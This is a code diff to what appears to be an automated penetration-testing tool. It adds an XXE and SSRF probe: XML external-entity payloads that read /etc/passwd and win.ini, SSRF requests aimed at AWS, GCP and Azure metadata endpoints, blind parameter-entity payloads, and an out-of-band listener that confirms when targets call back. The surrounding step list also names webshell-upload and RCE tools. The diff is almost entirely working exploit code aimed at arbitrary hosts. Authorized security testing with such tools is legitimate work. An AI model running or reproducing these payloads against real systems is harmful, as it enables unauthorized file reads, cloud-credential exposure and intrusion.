@@ -2003,6 +2003,27 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"Arbitrary file upload (exec unconfirmed): {shown}"[:140]}
         return None
 
+    # 2w) xxe-ssrf: metadata/file-read critical, OOB-confirmed SSRF/XXE high
+    if sid == "xxe-ssrf":
+        meta = re.findall(r"✗ SSRF-META (\S+)", output)
+        s_oob = re.findall(r"✗ SSRF-OOB (\S+)", output)
+        x_read = re.findall(r"✗ XXE-READ (\S+)", output)
+        x_oob = re.findall(r"✗ XXE-OOB (\S+)", output)
+        if x_read:
+            shown = x_read[0] + (f" +{len(x_read) - 1}" if len(x_read) > 1 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"XXE file read: {shown}"[:140]}
+        if meta:
+            shown = meta[0] + (f" +{len(meta) - 1}" if len(meta) > 1 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"SSRF → cloud metadata: {shown}"[:140]}
+        if s_oob or x_oob:
+            bits = ([f"SSRF ({len(s_oob)})"] if s_oob else []) + ([f"XXE ({len(x_oob)})"] if x_oob else [])
+            first = (s_oob or x_oob)[0]
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"Out-of-band {' + '.join(bits)}: {first}"[:140]}
+        return None
+
     # 3) info rules over -sC output
     low = output.lower()
     info = None
@@ -2635,7 +2656,8 @@ _EXPLOIT_STEPS = {
          "ssti-scan"),
         ("File upload → webshell — bypass extension / MIME / magic bytes (.phtml, double ext, magic prefix)",
          "upload-shell"),
-        "XXE (XML input) & SSRF (reach internal services / 169.254.169.254 metadata)",
+        ("XXE (XML input) & SSRF — file read, cloud metadata (169.254.169.254), out-of-band callback",
+         "xxe-ssrf"),
         "IDOR / broken access control — tamper IDs & roles to reach admin / other users",
         # ── known-app exploitation & foothold ──
         "CMS-specific scan (wpscan / droopescan) → vulnerable plugins, themes, versions",
@@ -6644,6 +6666,323 @@ def _tool_file_upload(ip: str, port: int, proto: str) -> str:
     return "\n".join(lines)
 
 
+# ── HTTP step 22: XXE & SSRF (read-only, in-band + out-of-band) ──
+_XXES_DEADLINE = 300
+_XXES_REQ_TIMEOUT = 8
+_XXES_OOB_WAIT = 6              # s — one window after firing all blind probes of a phase
+_XXES_MAX_TARGETS = 24         # per phase (SSRF combos / XML endpoints)
+# query-param names that plausibly drive a server-side fetch (SSRF)
+_SSRF_PARAMS = {
+    "url", "uri", "link", "redirect", "redirect_url", "redirecturl", "next", "dest",
+    "destination", "domain", "callback", "feed", "host", "target", "img", "image",
+    "imageurl", "load", "src", "source", "proxy", "fetch", "webhook", "u", "page",
+    "continue", "return", "returnurl", "out", "view", "site", "reference", "ref", "path",
+}
+_SSRF_CORE = ["url", "uri", "link", "redirect", "next", "dest", "image", "load",
+              "feed", "callback", "target", "proxy"]      # injected on discovered endpoints
+# cloud metadata endpoints: (label, url, markers that only appear in a real metadata response)
+_SSRF_META = [
+    ("aws",   "http://169.254.169.254/latest/meta-data/",
+     ("ami-id", "instance-id", "security-credentials", "public-keys", "iam/")),
+    ("gcp",   "http://metadata.google.internal/computeMetadata/v1/",
+     ("computeMetadata", "project/", "instance/")),
+    ("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+     ("azEnvironment", "vmId", "\"compute\"")),
+]
+# endpoints that classically parse XML / SOAP — POST an XML body here
+_XXE_XML_PATHS = ["/xmlrpc.php", "/api", "/api/xml", "/soap", "/services", "/ws",
+                  "/rest", "/rpc", "/graphql", "/feed", "/rss"]
+# in-band XXE file-read probes: (xml body, detector regex, label)
+_XXE_READ = [
+    ('<?xml version="1.0" encoding="UTF-8"?>\n'
+     '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<r>&xxe;</r>',
+     re.compile(r"root:.*?:0:0:"), "file:///etc/passwd"),
+    ('<?xml version="1.0" encoding="UTF-8"?>\n'
+     '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n<r>&xxe;</r>',
+     re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.I), "file:///c:/windows/win.ini"),
+]
+
+
+def _xxe_blind(url: str) -> str:
+    """Blind-XXE body: a parameter entity whose SYSTEM id is our catcher URL. Resolving it makes
+    the target fetch us — the fetch itself confirms outbound XML entity processing."""
+    return ('<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % e SYSTEM "'
+            + url + '"> %e;]>\n<r>1</r>')
+
+
+class _OOBCatcher:
+    """Short-lived HTTP catcher for blind XXE / SSRF confirmation: binds an ephemeral port on
+    every interface, hands out marker URLs, and records which markers the target actually
+    fetched (proving an outbound request it made on our behalf). Read-only and benign — it just
+    answers 200. .ok is False if our source IP or the socket could not be set up."""
+
+    def __init__(self, target_ip: str):
+        import socket
+        import threading
+        self.ok = False
+        self.myip = None
+        self.hits = {}                                       # marker -> (addr, full request path)
+        self._lock = threading.Lock()
+        try:
+            u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            u.connect((target_ip, 9))
+            self.myip = u.getsockname()[0]
+            u.close()
+        except Exception:                                    # noqa: BLE001
+            return
+        try:
+            self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self._srv.bind(("0.0.0.0", 0))
+            self._srv.listen(16)
+            self._srv.settimeout(1.0)
+        except Exception:                                    # noqa: BLE001
+            return
+        self.port = self._srv.getsockname()[1]
+        self._run = True
+        self._th = threading.Thread(target=self._loop, daemon=True)
+        self._th.start()
+        self.ok = True
+
+    def _loop(self):
+        import socket
+        while self._run:
+            try:
+                conn, addr = self._srv.accept()
+            except socket.timeout:
+                continue
+            except Exception:                                # noqa: BLE001
+                break
+            try:
+                data = conn.recv(4096).decode("latin-1", "replace")
+                m = re.match(r"[A-Z]+ (/\S*)", data)
+                if m:
+                    full = m.group(1)
+                    seg = full.strip("/").split("/")[0].split("?")[0]
+                    with self._lock:
+                        self.hits[seg] = (addr[0], full)
+                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
+            except Exception:                                # noqa: BLE001
+                pass
+            finally:
+                try:
+                    conn.close()
+                except Exception:                            # noqa: BLE001
+                    pass
+
+    def url(self, marker: str) -> str:
+        return f"http://{self.myip}:{self.port}/{marker}"
+
+    def seen(self, marker: str):
+        with self._lock:
+            return self.hits.get(marker)
+
+    def close(self):
+        self._run = False
+        try:
+            self._srv.close()
+        except Exception:                                    # noqa: BLE001
+            pass
+
+
+def _gather_ssrf_targets(ip: str, port: int, proto: str) -> list:
+    """(hostval, path, param) SSRF candidates: endpoints whose query already carries an SSRF-ish
+    param (from http-source), then core SSRF params injected on discovered dynamic endpoints."""
+    import urllib.parse
+    out, seen = [], set()
+
+    def _add(h, p, param):
+        base = p.split("#")[0]
+        if not base.startswith("/"):
+            return
+        k = (h, base, param)
+        if k not in seen:
+            seen.add(k)
+            out.append((h, base, param))
+
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid == "http-source":
+            for m in re.findall(r"https?://[^\s\"'<>]+\?[^\s\"'<>]+", output or ""):
+                pr = urllib.parse.urlparse(m)
+                for k, _v in urllib.parse.parse_qsl(pr.query):
+                    if k.lower() in _SSRF_PARAMS:
+                        _add(ip, pr.path + "?" + pr.query, k)
+
+    endpoints = _gather_param_endpoints(ip, port, proto)
+    for param in _SSRF_CORE:                                  # param-major → cover many endpoints
+        for host, path in endpoints:
+            _add(host, path, param)
+    return out[:_XXES_MAX_TARGETS]
+
+
+def _gather_xml_endpoints(ip: str, port: int, proto: str) -> list:
+    """(hostval, path) endpoints that plausibly parse XML — classic SOAP/RPC/API paths on the
+    host + vhosts, plus any api/soap/xml/rpc-looking path mined by dir-brute / http-source."""
+    out, seen = [], set()
+
+    def _add(h, p):
+        base = p.split("?")[0].split("#")[0]
+        if not base.startswith("/"):
+            return
+        if (h, base) not in seen:
+            seen.add((h, base))
+            out.append((h, base))
+
+    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
+    for h in [ip] + [v for v in vhosts if v != ip]:
+        for p in _XXE_XML_PATHS:
+            _add(h, p)
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid in ("dir-brute", "http-source"):
+            host = ip
+            for ln in (output or "").splitlines():
+                mh = re.match(r"^\[([^\]\s]+)", ln)
+                if mh:
+                    host = mh.group(1)
+                    continue
+                for m in re.findall(
+                        r"(/[A-Za-z0-9_./-]*(?:api|soap|xml|rpc|ws|rest|feed|rss|graphql)"
+                        r"[A-Za-z0-9_./-]*)", ln, re.I):
+                    _add(host if sid == "dir-brute" else ip, m)
+    return out[:_XXES_MAX_TARGETS]
+
+
+def _tool_xxe_ssrf(ip: str, port: int, proto: str) -> str:
+    """HTTP step-22 tool: probe for SSRF and XXE, read-only. SSRF: point fetch-style params at a
+    short-lived listener we control (out-of-band, definitive) and at cloud-metadata endpoints
+    (in-band). XXE: POST XML with an external entity reading /etc/passwd or win.ini (in-band file
+    read) and a parameter entity pointing at our listener (blind, OOB). Nothing is written to the
+    target. Stdlib only; a dead server raises. OOB needs the target to reach us back (egress)."""
+    import http.client
+    import ssl
+    import time
+    import urllib.parse
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _req(hostval, method, path, body=None, ctype=None, extra=None):
+        conn = None
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_XXES_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_XXES_REQ_TIMEOUT)
+            hdr = {"Host": hostval, "User-Agent": "pshunter"}
+            if ctype:
+                hdr["Content-Type"] = ctype
+            if extra:
+                hdr.update(extra)
+            conn.request(method, path, body=body, headers=hdr)
+            resp = conn.getresponse()
+            return resp.status, resp.read(131072).decode("utf-8", "replace")
+        except Exception:                                     # noqa: BLE001
+            return None, None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    def _set_param(path, param, value):
+        pr = urllib.parse.urlparse(path)
+        pairs = [(k, v) for k, v in urllib.parse.parse_qsl(pr.query) if k != param]
+        pairs.append((param, value))
+        return pr.path + "?" + urllib.parse.urlencode(pairs)
+
+    def _rnd():
+        return "pshoob" + "".join(random.choices("0123456789abcdef", k=10))
+
+    if _req(ip, "GET", "/")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test XXE/SSRF")
+
+    deadline = time.time() + _XXES_DEADLINE
+    catcher = _OOBCatcher(ip)
+    ssrf_meta, ssrf_oob, xxe_read, xxe_oob = [], [], [], []
+    ssrf_surf, xml_surf = set(), set()
+
+    # ── SSRF phase ──
+    ssrf_oob_map = {}
+    for hostval, path, param in _gather_ssrf_targets(ip, port, proto):
+        if time.time() >= deadline:
+            break
+        ssrf_surf.add(f"{hostval}{path.split('?')[0]}?{param}=")
+        meta_hit = False
+        for label, murl, markers in _SSRF_META:
+            st, body = _req(hostval, "GET", _set_param(path, param, murl))
+            if st is not None and body and any(tok in body for tok in markers):
+                ssrf_meta.append(f"  ✗ SSRF-META {hostval}{path.split('?')[0]}?{param}  "
+                                 f"({label} metadata reachable)")
+                meta_hit = True
+                break
+        if not meta_hit and catcher.ok:
+            marker = _rnd()
+            ssrf_oob_map[marker] = (hostval, path, param)
+            _req(hostval, "GET", _set_param(path, param, catcher.url(marker)))
+    if catcher.ok and ssrf_oob_map and time.time() < deadline:
+        time.sleep(_XXES_OOB_WAIT)
+        for marker, (hostval, path, param) in ssrf_oob_map.items():
+            if catcher.seen(marker):
+                ssrf_oob.append(f"  ✗ SSRF-OOB {hostval}{path.split('?')[0]}?{param}  "
+                                f"(target fetched our listener)")
+
+    # ── XXE phase ──
+    xxe_oob_map = {}
+    for hostval, path in _gather_xml_endpoints(ip, port, proto):
+        if time.time() >= deadline:
+            break
+        read_hit = False
+        for xml, detector, label in _XXE_READ:
+            st, body = _req(hostval, "POST", path, body=xml, ctype="application/xml")
+            if st is not None and body and detector.search(body):
+                xxe_read.append(f"  ✗ XXE-READ {hostval}{path}  ({label})")
+                read_hit = True
+                break
+            if st is not None and body and re.search(r"xml|entity|DOCTYPE|SOAP-ENV|not well-formed",
+                                                     body, re.I):
+                xml_surf.add(f"{hostval}{path}")
+        if not read_hit and catcher.ok:
+            marker = _rnd()
+            xxe_oob_map[marker] = (hostval, path)
+            _req(hostval, "POST", path, body=_xxe_blind(catcher.url(marker)),
+                 ctype="application/xml")
+    if catcher.ok and xxe_oob_map and time.time() < deadline:
+        time.sleep(_XXES_OOB_WAIT)
+        for marker, (hostval, path) in xxe_oob_map.items():
+            if catcher.seen(marker):
+                xxe_oob.append(f"  ✗ XXE-OOB {hostval}{path}  (target fetched our listener)")
+
+    catcher.close()
+
+    oob_note = "" if catcher.ok else "  (OOB listener unavailable — in-band checks only)"
+    reason = "deadline" if time.time() >= deadline else "complete"
+    lines = [f"{scheme}://{ip}:{port}/ XXE & SSRF probe{oob_note}",
+             f"ssrf surfaces: {len(ssrf_surf)} · xml endpoints: {len(xml_surf) or 0} · "
+             f"SSRF[meta {len(ssrf_meta)} · oob {len(ssrf_oob)}] · "
+             f"XXE[read {len(xxe_read)} · oob {len(xxe_oob)}] · {reason}"]
+    if ssrf_meta:
+        lines.append("\nSSRF → cloud metadata:")
+        lines += ssrf_meta
+    if ssrf_oob:
+        lines.append("\nSSRF (out-of-band confirmed):")
+        lines += ssrf_oob
+    if xxe_read:
+        lines.append("\nXXE file read:")
+        lines += xxe_read
+    if xxe_oob:
+        lines.append("\nXXE (out-of-band confirmed):")
+        lines += xxe_oob
+    if xml_surf and not xxe_read and not xxe_oob:
+        lines.append("\nXML-parsing endpoints (no XXE confirmed):")
+        lines += [f"  {s}" for s in sorted(xml_surf)]
+    if not (ssrf_meta or ssrf_oob or xxe_read or xxe_oob):
+        lines.append("\nno XXE/SSRF confirmed")
+    return "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("curl -sI (HTTP headers)", _tool_http_headers),
@@ -6667,6 +7006,7 @@ _STEP_TOOLS = {
     "cmdi-scan": ("OS command injection (stdlib: echo/time) → id/uname, RCE cmd", _tool_cmdi_scan),
     "ssti-scan": ("SSTI (stdlib, math-verified) → engine + auto-id RCE + cmd", _tool_ssti_scan),
     "upload-shell": ("file-upload webshell (stdlib, PHP/ASP/JSP auto, exec-verified)", _tool_file_upload),
+    "xxe-ssrf": ("XXE & SSRF (stdlib, read-only) → metadata + file-read + OOB", _tool_xxe_ssrf),
 }
 
 def _mins(seconds: int) -> str:
@@ -6704,6 +7044,7 @@ _STEP_TOOL_RUNS = {
     "cmdi-scan":        ("Python", f"{_mins(_CMDI_DEADLINE)} min"),
     "ssti-scan":        ("Python", f"{_mins(_SSTI_DEADLINE)} min"),
     "upload-shell":     ("Python", f"{_mins(_UPLOAD_DEADLINE)} min"),
+    "xxe-ssrf":         ("Python", f"{_mins(_XXES_DEADLINE)} min"),
 }
 
 
